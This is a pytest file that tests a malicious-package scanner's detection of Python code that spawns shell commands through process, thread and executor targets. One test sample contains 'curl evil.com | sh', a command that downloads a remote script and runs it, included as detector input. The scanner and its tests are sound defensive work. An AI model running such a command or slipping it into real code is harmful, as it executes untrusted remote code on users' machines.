"""Tests for ProcessSpawnAnalyzer (finding #4)."""

import pytest
from pkgxray.analyzers.process_spawn import ProcessSpawnAnalyzer
from pkgxray.analyzers.base import Severity


def test_multiprocessing_process_os_system_detected():
    """multiprocessing.Process(target=os.system) must be detected as HIGH."""
    code = (
        "import multiprocessing, os\n"
        "def run():\n"
        "    p = multiprocessing.Process(target=os.system, args=('id',))\n"
        "    p.start()\n"
    )
    findings = ProcessSpawnAnalyzer().analyze(code, "test.py")
    assert len(findings) >= 1
    assert any(f.severity == Severity.HIGH for f in findings)
    assert any("os.system" in f.description for f in findings)


def test_threading_thread_os_popen_detected():
    """threading.Thread(target=os.popen) must be detected as HIGH."""
    code = (
        "import threading, os\n"
        "t = threading.Thread(target=os.popen, args=('id',))\n"
        "t.start()\n"
    )
    findings = ProcessSpawnAnalyzer().analyze(code, "test.py")
    assert len(findings) >= 1
    assert any("os.popen" in f.description for f in findings)


def test_executor_submit_os_system_detected():
    """executor.submit(os.system, 'cmd') must be detected."""
    code = (
        "import concurrent.futures, os\n"
        "with concurrent.futures.ThreadPoolExecutor() as ex:\n"
        "    ex.submit(os.system, 'curl evil.com | sh')\n"
    )
    findings = ProcessSpawnAnalyzer().analyze(code, "test.py")
    assert len(findings) >= 1


def test_subprocess_run_as_target_detected():
    """Process(target=subprocess.run) must be detected."""
    code = (
        "import multiprocessing, subprocess\n"
        "p = multiprocessing.Process(target=subprocess.run, args=(['id'],))\n"
        "p.start()\n"
    )
    findings = ProcessSpawnAnalyzer().analyze(code, "test.py")
    assert len(findings) >= 1
    assert any("subprocess.run" in f.description for f in findings)


def test_from_import_alias_as_target_detected():
    """from subprocess import run; Process(target=run) must be detected via alias."""
    code = (
        "from subprocess import run\n"
        "import multiprocessing\n"
        "p = multiprocessing.Process(target=run, args=(['id'],))\n"
    )
    findings = ProcessSpawnAnalyzer().analyze(code, "test.py")
    assert len(findings) >= 1


def test_aliased_os_target_detected():
    """import os as operating_system; Process(target=operating_system.system) detected."""
    code = (
        "import os as operating_system, multiprocessing\n"
        "p = multiprocessing.Process(target=operating_system.system, args=('id',))\n"
    )
    findings = ProcessSpawnAnalyzer().analyze(code, "test.py")
    assert len(findings) >= 1


def test_module_level_spawn_is_critical():
    """Process(target=os.system) at module level (outside a function) must be CRITICAL."""
    code = (
        "import multiprocessing, os\n"
        "multiprocessing.Process(target=os.system, args=('id',)).start()\n"
    )
    findings = ProcessSpawnAnalyzer().analyze(code, "test.py")
    assert any(f.severity == Severity.CRITICAL for f in findings)


def test_legitimate_target_not_flagged():
    """Process(target=legitimate_function) must NOT produce a finding."""
    code = (
        "import multiprocessing\n"
        "\n"
        "def worker(x):\n"
        "    return x * 2\n"
        "\n"
        "p = multiprocessing.Process(target=worker, args=(5,))\n"
    )
    findings = ProcessSpawnAnalyzer().analyze(code, "test.py")
    assert findings == [], f"Unexpected findings: {findings}"


def test_process_without_target_kwarg_not_flagged():
    """Process() without a target= keyword must NOT produce a finding."""
    code = "import multiprocessing\np = multiprocessing.Process()\n"
    findings = ProcessSpawnAnalyzer().analyze(code, "test.py")
    assert findings == []


def test_process_spawn_in_test_suite():
    """ProcessSpawnAnalyzer must be registered in get_all_analyzers()."""
    from pkgxray.analyzers import get_all_analyzers
    from pkgxray.analyzers.process_spawn import ProcessSpawnAnalyzer
    analyzers = get_all_analyzers()
    assert any(isinstance(a, ProcessSpawnAnalyzer) for a in analyzers)


def test_process_spawn_in_analyzer_caps():
    """process_spawn must have an explicit entry in ANALYZER_CAPS."""
    from pkgxray.scorer import ANALYZER_CAPS
    assert "process_spawn" in ANALYZER_CAPS
